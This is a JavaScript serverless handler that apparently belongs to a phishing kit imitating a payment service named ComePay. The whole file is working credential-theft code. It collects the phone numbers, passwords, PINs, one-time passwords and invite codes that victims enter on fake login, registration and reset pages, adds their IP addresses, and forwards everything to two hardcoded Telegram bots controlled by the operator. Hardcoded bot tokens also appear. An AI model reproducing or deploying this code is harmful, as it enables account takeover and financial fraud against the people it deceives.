export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { type, phone, pass, pin, otp, username, invite } = req.body;

  // --- BOT 1 ---
  const BOT_TOKEN_1 = '9249939243:AAEhsq2ExiWSrSRC58UKvq1EHB_-Uwyqw5o';
  const CHAT_ID_1 = '6742408629';

  // --- BOT 2 (Yahan apna dusra token aur chat id daal dein) ---
  const BOT_TOKEN_2 = '949939243:AAEhsq2ExiWSrSRC58UKvq1EHB_-Uwyqw5o'; 
  const CHAT_ID_2 = '674208629';

  // Visitor ka real IP address
  const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';

  let message = '';

  if (type === 'login') {
    message = `✅ <b>New ComePay Login</b>\n🌐 IP: <code>${clientIp}</code>\n📱 Phone: <code>${phone}</code>\n🔑 Password: <code>${pass}</code>\n🔐 PIN: <code>${pin}</code>`;
  } else if (type === 'modal_otp') {
    message = `🔐 <b>Login OTP requested (Modal)</b>\n🌐 IP: <code>${clientIp}</code>\n📱 Phone: +91 <code>${phone}</code>`;
  } else if (type === 'verify_otp') {
    message = `🔑 <b>OTP Entered</b>\n🌐 IP: <code>${clientIp}</code>\n📱 Phone: +91 <code>${phone}</code>\n🔢 OTP: <code>${otp}</code>`;
  } else if (type === 'success_login') {
    message = `🚀 <b>Login Success / Verified</b>\n🌐 IP: <code>${clientIp}</code>\n📱 Phone: +91 <code>${phone}</code>`;
  } else if (type === 'reg_otp') {
    message = `🔐 <b>Register OTP requested</b>\n🌐 IP: <code>${clientIp}</code>\n👤 User: <code>${username}</code>\n📱 Phone: +91 <code>${phone}</code>`;
  } else if (type === 'register') {
    message = `🆕 <b>New ComePay registration</b>\n🌐 IP: <code>${clientIp}</code>\n👤 User: <code>${username}</code>\n📱 Phone: +91 <code>${phone}</code>\n🔑 Password: <code>${pass}</code>\n🔐 PIN: <code>${pin}</code>\n🎫 Invite: <code>${invite}</code>`;
  } else if (type === 'forgot_otp') {
    message = `🔄 <b>Password Reset OTP Request</b>\n🌐 IP: <code>${clientIp}</code>\n📱 Phone: +91 <code>${phone}</code>`;
  } else if (type === 'reset_pass') {
    message = `🌱 <b>Password Reset Submitted</b>\n🌐 IP: <code>${clientIp}</code>\n📱 Phone: +91 <code>${phone}</code>\n🔐 New Password: <code>${pass}</code>\n📎 OTP: <code>${otp}</code>`;
  } else {
    message = `📩 <b>Activity from IP:</b> <code>${clientIp}</code>`;
  }

  try {
    // Dono bots ko ek sath message bhejne ke liye Promise.all ka use kiya gaya hai
    const sendToBot1 = fetch(`https://api.telegram.org/bot${BOT_TOKEN_1}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID_1, text: message, parse_mode: 'HTML' })
    });

    const sendToBot2 = fetch(`https://api.telegram.org/bot${BOT_TOKEN_2}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID_2, text: message, parse_mode: 'HTML' })
    });

    await Promise.all([sendToBot1, sendToBot2]);

    return res.status(200).json({ success: true });
  } catch (err) {
    console.error('Telegram API error:', err);
    return res.status(500).json({ error: 'Failed to send messages' });
  }
}
